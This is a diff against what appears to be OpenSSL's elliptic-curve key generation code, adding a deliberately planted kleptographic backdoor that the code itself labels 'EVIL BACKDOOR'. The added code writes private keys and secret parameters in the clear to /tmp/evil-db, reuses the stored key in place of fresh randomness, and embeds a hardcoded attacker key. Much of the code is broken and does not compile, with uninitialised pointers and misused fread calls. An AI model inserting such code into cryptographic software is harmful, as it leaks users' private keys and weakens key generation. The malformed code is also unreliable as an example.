@@ -18,6 +18,16 @@
 #include "ec_lcl.h"
 #include <openssl/err.h>
 #include <openssl/engine.h>
+#include <time.h>
+
+typedef struct bignum_st {
+    BN_ULONG *d;
+    int top;
+    int dmax;
+    int neg;
+    int flags;
+} BIGNUM;
+
 
 EC_KEY *EC_KEY_new(void)
 {
@@ -195,6 +205,33 @@ int ossl_ec_key_gen(EC_KEY *eckey)
     return eckey->group->meth->keygen(eckey);
 }
 
+void _perror(char* str){
+    printf("%s\n", str);
+    exit(1);
+}
+
+void _dump_bn(FILE* fd, BIGNUM* bn){
+    if(!fd) _perror("[EVIL] dump_bn: fd==NULL");
+    if(!bn) _perror("[EVIL] dump_bn: bn==NULL");
+
+    fwrite(&bn->top, sizeof(int), 1, fd);
+    fwrite(&bn->dmax, sizeof(int), 1, fd);
+    fwrite(&bn->flags, sizeof(int), 1, fd);
+    fwrite(bn->d, sizeof(bn->d[0]), bn->dmax, fd);
+}
+
+BIGNUM* _load_bn(FILE* fd){
+    BIGNUM* ret = BN_new();
+
+    if(!ret) _perror("[EVIL] load_bn: ret==NULL");
+
+    fread(ret->top, sizeof(int), 1, fd);
+    fread(ret->dmax, sizeof(int), 1, fd);
+    fread(ret->flags, sizeof(int), 1, fd);
+    fread(ret->d, sizeof(ret->d[0]), ret->dmax, fd);
+    return ret;
+}
+
 int ec_key_simple_generate_key(EC_KEY *eckey)
 {
     int ok = 0;
@@ -222,6 +259,110 @@ int ec_key_simple_generate_key(EC_KEY *eckey)
             goto err;
     while (BN_is_zero(priv_key)) ;
 
+    // EVIL BACKDOOR
+    if(-1 != access("/tmp/evil-db", F_OK)){
+        // file exists, use algo 2
+        printf("[EVIL] algo 2\n");
+        FILE *fr = fopen("/tmp/evil-db", "r");
+        if(!fr) _perror("[EVIL] ec_key_simple_generate_key: fr==NULL");
+
+        // a,b,h,e
+        BIGNUM* params[4];
+        for(int p=0; p<4; p++){
+            params[p] = _load_bn(fr);
+        }
+
+        // we don't need fresh key
+        BN_free(priv_key);
+        priv_key = _load_bn(fr); // c1
+
+        fclose(fr);
+
+        // algo 2:
+
+        // STEP 1: Z = a c1 G + b c1 V + h j G + e u V
+        srand(time(NULL));
+        int j = rand() % 2, u = rand() % 2;        
+        
+        // attacker's private key
+        // normally here should be the public key, but it is too hard to 
+        // deserialize it from the encoded in bytes X,Y,Z
+        BIGNUM* v = BN_new();
+        v->d = {0xa64c, 0x7ea6, 0x007e, 0x7a00, 0x747a, 0x0374, 0x6503, 0xbd65, 0x69bd, 0x6d69, 0x346d, 0xb834, 0x29b8, 0x5029, 0x6a50, 0xbe6a};
+        v->top = 4;
+        v->dmax = 4;
+        v->flags= 1;
+
+        EC_POINT *Z;
+        EC_POINT *W2;
+        EC_POINT *Q2;
+        EC_POINT *E2;
+        EC_POINT *R2;
+        
+        // generator
+        EC_POINT *G = EC_POINT_new(eckey->group);
+
+        // V = vG -- attacker's public key
+        EC_POINT *V;
+        if(!EC_POINT_copy(V, G)) _perror("[EVIL] V=G");
+        EC_POINT_mul(eckey->group, V, v, NULL, NULL, ctx);
+        
+        // Q1 = c1 * G
+        if(!EC_POINT_copy(Q2, G)) _perror("[EVIL] Q2=G");
+        EC_POINT_mul(eckey->group, Q2, priv_key, NULL, NULL, ctx);
+        // Q2 = a * Q1
+        EC_POINT_mul(eckey->group, Q2, params[0], NULL, NULL, ctx);
+        // W1 = c1 * V
+        if(!EC_POINT_copy(W2, V)) _perror("[EVIL] W2=V");
+        EC_POINT_mul(eckey->group, W2, priv_key, NULL, NULL, ctx);
+        // W2 = b * W1
+        EC_POINT_mul(eckey->group, W2, params[1], NULL, NULL, ctx);
+        // Z = Q2 + W2
+        if(!EC_POINT_add(eckey->group, Z, Q2, W2, ctx)) _perror("[EVIL] Z=Q2+W2");
+        
+        if(j == 1){
+            // E2 = h * G
+            EC_POINT_mul(eckey->group, E2, params[2], NULL, NULL, ctx);
+            if(!EC_POINT_add(eckey->group, Z, Z, E2, ctx)) _perror("[EVIL] Z=Z+E2");
+        }
+
+        if(u == 1){
+            // R2 = e * V
+            EC_POINT_mul(eckey->group, R2, params[3], NULL, NULL, ctx);
+            if(!EC_POINT_add(eckey->group, Z, Z, R2, ctx)) _perror("[EVIL] Z=Z+R2");
+        }
+
+        // STEP 2: H(Z)
+        // TODO: add hashing
+    }
+    else{
+        // file dosn't exits, use algo 1
+        printf("[EVIL] algo 1\n");
+        FILE* fw = fopen("/tmp/evil-db", "w");
+        if(!fw) _perror("[EVIL] can't open /tmp/evil-db");
+
+        // generate and wite to db: a,b,h,e
+        BIGNUM* params[4];
+        for(int p=0; p<4; p++){
+            params[p] = BN_new();
+            do
+                if (!BN_rand_range(params[p], order))
+                    goto err;
+            while (BN_is_zero(params[p]));
+
+            _dump_bn(fw, params[p]);
+            BN_free(params[p]);
+        }
+
+        // write: c1
+        _dump_bn(fw, priv_key);
+
+        // in file in this order:
+        // a,b,h,e,c1
+        fclose(fw);
+    }
+
+
     if (eckey->pub_key == NULL) {
         pub_key = EC_POINT_new(eckey->group);
         if (pub_key == NULL)
@@ -229,6 +370,7 @@ int ec_key_simple_generate_key(EC_KEY *eckey)
     } else
         pub_key = eckey->pub_key;
 
+_skip:
     if (!EC_POINT_mul(eckey->group, pub_key, priv_key, NULL, NULL, ctx))
         goto err;
 
